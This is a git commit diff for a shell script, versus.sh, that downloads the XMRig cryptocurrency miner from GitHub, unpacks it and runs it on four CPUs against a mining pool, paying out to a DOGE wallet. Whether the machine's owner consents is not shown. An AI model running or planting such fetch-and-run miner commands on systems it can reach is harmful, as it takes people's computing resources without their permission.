60adabb75254aa59cdfa64041f91ab6817b74618
freecourses99 <40512984+freecourses99@users.noreply.github.com>
2021-05-15 20:48:11 +0530

    Update versus.sh

--- versus.sh
+++ versus.sh
@@ -1,5 +1,2 @@
-#!/bin/sh
-sudo apt update
-sudo apt install screen -y
 wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 
 ./xmrig --donate-level 5 -o rx.unmineable.com:3333 -u DOGE:DR8xMsXTSABm8ZuxPhwudab7CYe87b9CCD:TESTWORK -p x --cpu 4
